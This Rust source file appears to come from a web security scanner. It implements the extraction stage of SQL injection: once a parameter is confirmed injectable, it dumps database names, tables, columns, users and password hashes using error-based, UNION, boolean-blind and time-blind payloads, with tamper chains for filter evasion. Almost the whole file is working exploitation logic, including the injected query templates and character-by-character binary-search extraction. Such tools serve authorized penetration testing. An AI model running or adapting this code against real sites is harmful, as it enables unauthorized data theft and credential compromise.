//! Database enumeration engine.
//!
//! Post-detection extraction of database structure and contents using
//! whichever injection technique was confirmed.

use std::sync::Arc;
use tokio::sync::Mutex;

use crate::error::Result;
use crate::fuzzer::param::FuzzTarget;
use crate::scan::ScanCtx;
use crate::target::Mark;

use super::config::SqliConfig;
use super::dbms::Dbms;
use super::detection;
use super::payloads;
use super::tamper::TamperChain;
use super::technique::{SqliFinding, Technique};

/// Enumeration results container.
#[derive(Debug, Clone, Default)]
pub struct EnumResult {
    pub databases: Vec<String>,
    pub tables: Vec<String>,
    pub columns: Vec<String>,
    pub users: Vec<String>,
    pub password_hashes: Vec<(String, String)>,
    pub dump: Vec<Vec<String>>,
}

/// Run enumeration on a confirmed injectable parameter.
pub async fn enumerate(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    finding: &SqliFinding,
    config: &SqliConfig,
    tamper: &TamperChain,
) -> Result<EnumResult> {
    let mut result = EnumResult::default();
    let targets = config.enumerate_targets();

    if targets.is_empty() {
        return Ok(result);
    }

    let (host, port, ssl) = {
        let m = mark.lock().await;
        (m.hostname.clone(), m.port, m.ssl)
    };

    let point_idx = target
        .points
        .iter()
        .position(|p| p.name() == finding.parameter)
        .unwrap_or(0);

    let dbms = finding.dbms;

    for t in &targets {
        if ctx.is_cancelled() {
            break;
        }

        match *t {
            "dbs" => {
                result.databases = extract_list(
                    ctx,
                    mark.clone(),
                    target,
                    point_idx,
                    finding,
                    dbms.databases_query(),
                    config,
                    tamper,
                    &host,
                    port,
                    ssl,
                )
                .await?;
                tracing::info!("enumerated {} databases", result.databases.len());
            }
            "tables" => {
                let db = current_database(
                    ctx, mark.clone(), target, point_idx, finding, dbms, config, tamper, &host,
                    port, ssl,
                )
                .await?;
                let query = dbms.tables_query(&db);
                result.tables = extract_list(
                    ctx,
                    mark.clone(),
                    target,
                    point_idx,
                    finding,
                    &query,
                    config,
                    tamper,
                    &host,
                    port,
                    ssl,
                )
                .await?;
                tracing::info!("enumerated {} tables in {}", result.tables.len(), db);
            }
            "columns" => {
                // Enumerate columns for all discovered tables
                let db = current_database(
                    ctx, mark.clone(), target, point_idx, finding, dbms, config, tamper, &host,
                    port, ssl,
                )
                .await?;
                for table in &result.tables {
                    if ctx.is_cancelled() {
                        break;
                    }
                    let query = dbms.columns_query(&db, table);
                    let cols = extract_list(
                        ctx,
                        mark.clone(),
                        target,
                        point_idx,
                        finding,
                        &query,
                        config,
                        tamper,
                        &host,
                        port,
                        ssl,
                    )
                    .await?;
                    tracing::info!("table {}: {} columns", table, cols.len());
                    result.columns.extend(
                        cols.iter().map(|c| format!("{table}.{c}")),
                    );
                }
            }
            "users" => {
                result.users = extract_list(
                    ctx,
                    mark.clone(),
                    target,
                    point_idx,
                    finding,
                    dbms.users_query(),
                    config,
                    tamper,
                    &host,
                    port,
                    ssl,
                )
                .await?;
                tracing::info!("enumerated {} users", result.users.len());
            }
            "passwords" => {
                let hash_data = extract_list(
                    ctx,
                    mark.clone(),
                    target,
                    point_idx,
                    finding,
                    dbms.password_hashes_query(),
                    config,
                    tamper,
                    &host,
                    port,
                    ssl,
                )
                .await?;
                for entry in hash_data {
                    let parts: Vec<&str> = entry.splitn(2, ':').collect();
                    if parts.len() == 2 {
                        result
                            .password_hashes
                            .push((parts[0].to_string(), parts[1].to_string()));
                    }
                }
                tracing::info!(
                    "enumerated {} password hashes",
                    result.password_hashes.len()
                );
            }
            _ => {
                tracing::debug!("unknown enumerate target: {t}");
            }
        }
    }

    Ok(result)
}

/// Extract the current database name.
async fn current_database(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    finding: &SqliFinding,
    dbms: Dbms,
    config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<String> {
    let query = format!("SELECT {}", dbms.current_db_fn());
    let results = extract_list(
        ctx, mark, target, point_idx, finding, &query, config, tamper, host, port, ssl,
    )
    .await?;
    Ok(results.into_iter().next().unwrap_or_else(|| "main".to_string()))
}

/// Extract a list of values using the confirmed injection technique.
async fn extract_list(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    finding: &SqliFinding,
    sql_query: &str,
    config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Vec<String>> {
    match finding.technique {
        Technique::ErrorBased => {
            extract_via_error(
                ctx, mark, target, point_idx, finding.dbms, sql_query, config, tamper, host,
                port, ssl,
            )
            .await
        }
        Technique::UnionQuery => {
            extract_via_union(
                ctx, mark, target, point_idx, finding.dbms, sql_query, config, tamper, host,
                port, ssl,
            )
            .await
        }
        Technique::BooleanBlind => {
            extract_via_boolean(
                ctx, mark, target, point_idx, finding.dbms, sql_query, config, tamper, host,
                port, ssl,
            )
            .await
        }
        Technique::TimeBlind => {
            extract_via_time(
                ctx, mark, target, point_idx, finding.dbms, sql_query, config, tamper, host,
                port, ssl,
            )
            .await
        }
        _ => Ok(Vec::new()),
    }
}

/// Error-based extraction: use EXTRACTVALUE/UPDATEXML/CAST to leak data.
async fn extract_via_error(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    sql_query: &str,
    _config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Vec<String>> {
    let mut results = Vec::new();

    // Wrap query with GROUP_CONCAT or equivalent for MySQL
    let wrapped = match dbms {
        Dbms::MySQL | Dbms::MariaDB => {
            format!("SELECT GROUP_CONCAT(x SEPARATOR ',') FROM ({sql_query}) AS t(x)")
        }
        Dbms::PostgreSQL => {
            format!("SELECT STRING_AGG(x::text, ',') FROM ({sql_query}) AS t(x)")
        }
        _ => sql_query.to_string(),
    };

    let extraction_payloads = payloads::error_extraction_payloads(dbms, &wrapped);

    for payload in &extraction_payloads {
        if ctx.is_cancelled() {
            break;
        }

        let tampered = if tamper.is_empty() {
            payload.clone()
        } else {
            tamper.apply(payload, Some(dbms))
        };

        let form = None;
        let mut req = target.inject(point_idx, &tampered, host, port, form);
        req.ssl = ssl;

        let resp = match ctx.nfetch(mark.clone(), &mut req).await {
            Ok(r) => r,
            Err(_) => continue,
        };

        let body = resp.body_str();

        // Parse extracted data from error messages
        if let Some(data) = extract_from_error_body(&body) {
            results.extend(data.split(',').map(|s| s.trim().to_string()));
            break;
        }
    }

    Ok(results)
}

/// UNION-based extraction: inject query into visible column.
async fn extract_via_union(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    sql_query: &str,
    _config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Vec<String>> {
    // Simplified: assumes we know column count and visible col from prior detection
    // In practice, these would be stored from the detection phase
    let marker = detection::union_marker();
    let concat_expr = dbms.concat(
        &dbms.concat(&format!("'{marker}'"), &format!("({sql_query})")),
        &format!("'{marker}'"),
    );

    // Try a few common column counts
    for cols in 1..=10 {
        if ctx.is_cancelled() {
            break;
        }

        for vcol in 0..cols {
            let columns: Vec<String> = (0..cols)
                .map(|i| {
                    if i == vcol {
                        concat_expr.clone()
                    } else {
                        "NULL".to_string()
                    }
                })
                .collect();

            let from = dbms.from_dummy();
            let payload = format!("' UNION ALL SELECT {}{from} --", columns.join(","));
            let tampered = if tamper.is_empty() {
                payload
            } else {
                tamper.apply(&payload, Some(dbms))
            };

            let form = None;
            let mut req = target.inject(point_idx, &tampered, host, port, form);
            req.ssl = ssl;

            let resp = match ctx.nfetch(mark.clone(), &mut req).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            if let Some(data) = detection::extract_data_from_union(&resp.body_str(), &marker) {
                return Ok(data.split(',').map(|s| s.trim().to_string()).collect());
            }
        }
    }

    Ok(Vec::new())
}

/// Boolean-based blind extraction via binary search.
async fn extract_via_boolean(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    sql_query: &str,
    config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Vec<String>> {
    // First get count
    let count_query = format!("SELECT COUNT(*) FROM ({sql_query}) AS t");
    let count = extract_number_boolean(
        ctx,
        mark.clone(),
        target,
        point_idx,
        dbms,
        &count_query,
        config,
        tamper,
        host,
        port,
        ssl,
    )
    .await?
    .unwrap_or(0);

    let mut results = Vec::new();

    for i in 0..count.min(100) {
        // Cap at 100 rows
        if ctx.is_cancelled() {
            break;
        }

        let row_query = match dbms {
            Dbms::MySQL | Dbms::MariaDB => {
                format!("{sql_query} LIMIT {i},1")
            }
            Dbms::PostgreSQL | Dbms::SQLite => {
                format!("{sql_query} LIMIT 1 OFFSET {i}")
            }
            Dbms::MSSQL => {
                format!("SELECT TOP 1 x FROM ({sql_query}) AS t WHERE x NOT IN (SELECT TOP {i} x FROM ({sql_query}) AS t2)")
            }
            _ => format!("{sql_query} LIMIT 1 OFFSET {i}"),
        };

        let value = extract_string_boolean(
            ctx,
            mark.clone(),
            target,
            point_idx,
            dbms,
            &row_query,
            config,
            tamper,
            host,
            port,
            ssl,
        )
        .await?;

        if let Some(v) = value {
            results.push(v);
        }
    }

    Ok(results)
}

/// Extract a number via boolean binary search.
async fn extract_number_boolean(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    sql_expr: &str,
    _config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Option<usize>> {
    // Get baseline
    let mut baseline_req = crate::http::request::Request::new(host, port, &target.method, "/");
    baseline_req.uri = extract_path(&target.url);
    baseline_req.ssl = ssl;
    let baseline = match ctx.nfetch(mark.clone(), &mut baseline_req).await {
        Ok(r) => r.body,
        Err(_) => return Ok(None),
    };
    let baseline_clean = detection::remove_dynamic_content(&String::from_utf8_lossy(&baseline));

    let mut low = 0u64;
    let mut high = 1024u64;

    // Binary search for the number
    for _ in 0..20 {
        if ctx.is_cancelled() || low >= high {
            break;
        }

        let mid = (low + high) / 2;
        let payload = format!("AND ({sql_expr})>{mid}");
        let tampered = if tamper.is_empty() {
            payload
        } else {
            tamper.apply(&payload, Some(dbms))
        };

        let form = None;
        let mut req = target.inject(point_idx, &tampered, host, port, form);
        req.ssl = ssl;

        let resp = match ctx.nfetch(mark.clone(), &mut req).await {
            Ok(r) => r,
            Err(_) => break,
        };

        let resp_clean = detection::remove_dynamic_content(&resp.body_str());
        let ratio = detection::page_ratio(baseline_clean.as_bytes(), resp_clean.as_bytes());

        if ratio >= 0.9 {
            low = mid + 1;
        } else {
            high = mid;
        }
    }

    Ok(Some(low as usize))
}

/// Extract a string character-by-character via boolean binary search.
async fn extract_string_boolean(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    sql_expr: &str,
    _config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Option<String>> {
    let mut baseline_req = crate::http::request::Request::new(host, port, &target.method, "/");
    baseline_req.uri = extract_path(&target.url);
    baseline_req.ssl = ssl;
    let baseline = match ctx.nfetch(mark.clone(), &mut baseline_req).await {
        Ok(r) => r.body,
        Err(_) => return Ok(None),
    };
    let baseline_clean = detection::remove_dynamic_content(&String::from_utf8_lossy(&baseline));

    let mut result = String::new();

    // Extract up to 256 characters
    for pos in 1..=256 {
        if ctx.is_cancelled() {
            break;
        }

        let substr_fn = match dbms {
            Dbms::MySQL | Dbms::MariaDB => format!("ORD(MID(({sql_expr}),{pos},1))"),
            Dbms::PostgreSQL | Dbms::SQLite => {
                format!("ASCII(SUBSTRING(({sql_expr}),{pos},1))")
            }
            Dbms::MSSQL => format!("UNICODE(SUBSTRING(({sql_expr}),{pos},1))"),
            Dbms::Oracle => format!("ASCII(SUBSTR(({sql_expr}),{pos},1))"),
            _ => format!("ASCII(SUBSTRING(({sql_expr}),{pos},1))"),
        };

        // Binary search for this character's ASCII value
        let mut low = 0u8;
        let mut high = 127u8;
        for _ in 0..8 {
            if ctx.is_cancelled() || low >= high {
                break;
            }

            let mid = (low as u16 + high as u16) / 2;
            let payload = format!("AND {substr_fn}>{mid}");
            let tampered = if tamper.is_empty() {
                payload
            } else {
                tamper.apply(&payload, Some(dbms))
            };

            let form = None;
            let mut req = target.inject(point_idx, &tampered, host, port, form);
            req.ssl = ssl;

            let resp = match ctx.nfetch(mark.clone(), &mut req).await {
                Ok(r) => r,
                Err(_) => break,
            };

            let resp_clean = detection::remove_dynamic_content(&resp.body_str());
            let ratio =
                detection::page_ratio(baseline_clean.as_bytes(), resp_clean.as_bytes());

            if ratio >= 0.9 {
                low = mid as u8 + 1;
            } else {
                high = mid as u8;
            }
        }

        if low == 0 {
            break; // End of string (NULL character)
        }

        result.push(low as char);
    }

    if result.is_empty() {
        Ok(None)
    } else {
        Ok(Some(result))
    }
}

/// Time-based blind extraction (similar to boolean but uses timing).
async fn extract_via_time(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    sql_query: &str,
    config: &SqliConfig,
    tamper: &TamperChain,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Vec<String>> {
    // Time-based extraction is very slow — limit to essential data
    let delay = config.time_delay;

    // Measure baseline
    let mut baseline_times = Vec::new();
    for _ in 0..3 {
        let mut req = crate::http::request::Request::new(host, port, &target.method, "/");
        req.uri = extract_path(&target.url);
        req.ssl = ssl;
        if let Ok(resp) = ctx.nfetch(mark.clone(), &mut req).await {
            baseline_times.push(resp.elapsed);
        }
    }
    if baseline_times.is_empty() {
        return Ok(Vec::new());
    }
    baseline_times.sort();
    let baseline_median = baseline_times[baseline_times.len() / 2];

    let mut result_string = String::new();

    for pos in 1..=128 {
        if ctx.is_cancelled() {
            break;
        }

        let substr_fn = match dbms {
            Dbms::MySQL | Dbms::MariaDB => format!("ORD(MID(({sql_query}),{pos},1))"),
            Dbms::PostgreSQL => format!("ASCII(SUBSTRING(({sql_query}),{pos},1))"),
            Dbms::MSSQL => format!("UNICODE(SUBSTRING(({sql_query}),{pos},1))"),
            _ => format!("ASCII(SUBSTRING(({sql_query}),{pos},1))"),
        };

        let mut low = 0u8;
        let mut high = 127u8;

        for _ in 0..8 {
            if ctx.is_cancelled() || low >= high {
                break;
            }

            let mid = (low as u16 + high as u16) / 2;
            let condition = format!("{substr_fn}>{mid}");
            let sleep = dbms.sleep_call(delay);
            let payload = format!("AND IF({condition},{sleep},0)");
            let tampered = if tamper.is_empty() {
                payload
            } else {
                tamper.apply(&payload, Some(dbms))
            };

            let form = None;
            let mut req = target.inject(point_idx, &tampered, host, port, form);
            req.ssl = ssl;
            req.timeout_secs = (delay as u64 + 15).max(req.timeout_secs);

            let resp = match ctx.nfetch(mark.clone(), &mut req).await {
                Ok(r) => r,
                Err(_) => break,
            };

            let threshold = baseline_median
                + std::time::Duration::from_secs_f64(delay as f64 * 0.8);

            if resp.elapsed >= threshold {
                low = mid as u8 + 1;
            } else {
                high = mid as u8;
            }
        }

        if low == 0 {
            break;
        }
        result_string.push(low as char);
    }

    if result_string.is_empty() {
        Ok(Vec::new())
    } else {
        Ok(result_string.split(',').map(|s| s.trim().to_string()).collect())
    }
}

/// Parse data from DBMS error messages.
fn extract_from_error_body(body: &str) -> Option<String> {
    // Try ~ delimiters (EXTRACTVALUE/UPDATEXML)
    if let Some(start) = body.find('~') {
        let after = &body[start + 1..];
        if let Some(end) = after.find('~') {
            let data = &after[..end];
            if !data.is_empty() && data.len() < 500 {
                return Some(data.to_string());
            }
        }
    }

    // MSSQL CAST/CONVERT error
    if let Some(start) = body.find("nvarchar value '") {
        let after = &body[start + 16..];
        if let Some(end) = after.find('\'') {
            let data = &after[..end];
            if !data.is_empty() {
                return Some(data.to_string());
            }
        }
    }

    // PostgreSQL invalid input syntax
    if let Some(start) = body.find("invalid input syntax for") {
        let after = &body[start..];
        if let Some(q_start) = after.find('"') {
            let after_q = &after[q_start + 1..];
            if let Some(q_end) = after_q.find('"') {
                let data = &after_q[..q_end];
                if !data.is_empty() {
                    return Some(data.to_string());
                }
            }
        }
    }

    None
}

fn extract_path(url: &str) -> String {
    url::Url::parse(url)
        .map(|u| {
            let mut s = u.path().to_string();
            if let Some(q) = u.query() {
                s.push('?');
                s.push_str(q);
            }
            s
        })
        .unwrap_or_else(|_| "/".to_string())
}
